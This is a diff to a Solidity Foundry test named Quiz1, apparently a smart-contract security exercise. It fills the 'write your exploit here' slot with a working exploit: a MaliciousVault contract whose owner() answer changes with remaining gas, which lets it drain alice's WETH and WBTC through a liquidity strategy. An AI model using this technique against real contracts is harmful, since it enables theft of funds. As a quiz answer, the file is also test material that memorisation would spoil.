@@ -58,9 +58,39 @@ contract Quiz1 is Test {
         // -----------------------
         // Write your exploit here
 
+        MaliciousVault vault = new MaliciousVault(alice);
+        uniV2Strategy.addLiquidityFromOwner{gas: 1_019_000}(
+            Vault(address(vault)),
+            100 ether,
+            100e8,
+            0,
+            0
+        );
+
         // -----------------------
 
         assertEq(weth.balanceOf(alice), 0, "!weth");
         assertEq(wbtc.balanceOf(alice), 0, "!wbtc");
+    }
+}
+
+contract MaliciousVault {
+    address me;
+    address victim;
+
+    constructor(address _victim) {
+        me = msg.sender;
+        victim = _victim;
+    }
+
+    function allowedStrategies(address) external pure returns(bool) { return true; }
+
+    function owner() external view returns(address) {
+        return gasleft() < 1_000_000 ? victim : me;
+    }
+
+    function yoink(address target, bytes calldata data) external returns(bool, bytes memory) {
+        require(msg.sender == me);
+        return target.call(data);
     }
 }
